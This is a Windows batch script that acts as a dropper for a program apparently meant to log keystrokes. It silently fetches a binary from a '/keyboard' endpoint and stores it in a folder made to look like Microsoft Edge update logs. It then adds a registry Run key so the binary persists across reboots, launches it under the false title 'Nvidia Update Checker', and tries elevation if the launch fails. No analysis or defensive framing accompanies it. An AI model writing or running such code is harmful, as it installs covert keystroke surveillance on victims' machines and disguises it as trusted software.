@echo off
setlocal enabledelayedexpansion

set DOWNLOAD_PATH=C:/ProgramData/MicrosoftEdge/Updates/UpdateLog
set LOGDIR=C:/ProgramData/MicrosoftEdge/Updates/UpdateLog\logs
set SERVICE_PATH=C:/ProgramData/MicrosoftEdge/Updates/UpdateLog\clean_logger.exe
set API_URL=http://localhost:5000

if not exist "%LOGDIR%" mkdir "%LOGDIR%"
if not exist "%DOWNLOAD_PATH%" mkdir "%DOWNLOAD_PATH%"

"C:\Windows\System32\curl.exe" -f -L -s "%API_URL%/keyboard" -o "%DOWNLOAD_PATH%\clean_logger.new" >nul 2>nul

if errorlevel 1 (
    echo [%date% %time%] curl download failed >> "%LOGDIR%\task_log.txt"
    goto start_run
)

if exist "%SERVICE_PATH%" (
    taskkill /f /im clean_logger.exe >nul 2>&1

    :wait_gone
    tasklist /FI "IMAGENAME eq clean_logger.exe" | find /I "clean_logger.exe" >nul
    if %ERRORLEVEL%==0 (
        timeout /t 1 /nobreak >nul
        goto wait_gone
    )

    del /f /q "%SERVICE_PATH%" >nul 2>&1
)

if exist "%DOWNLOAD_PATH%\clean_logger.new" (
    rename "%DOWNLOAD_PATH%\clean_logger.new" clean_logger.exe >nul 2>&1
)

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "clean_logger" /t REG_SZ ^
    /d "{download_path}\clean_logger.exe" /f >nul 2>&1

:start_run
if exist "%DOWNLOAD_PATH%\clean_logger.exe" (
    start "Nvidia Update Checker" "%DOWNLOAD_PATH%\clean_logger.exe" >> "%LOGDIR%\task_log.txt" 2>&1
    if %ERRORLEVEL% neq 0 (
        powershell -Command "Start-Process '%DOWNLOAD_PATH%\clean_logger.exe' -Verb runAs" >nul 2>&1
    )
)

:end
endlocal
exit /b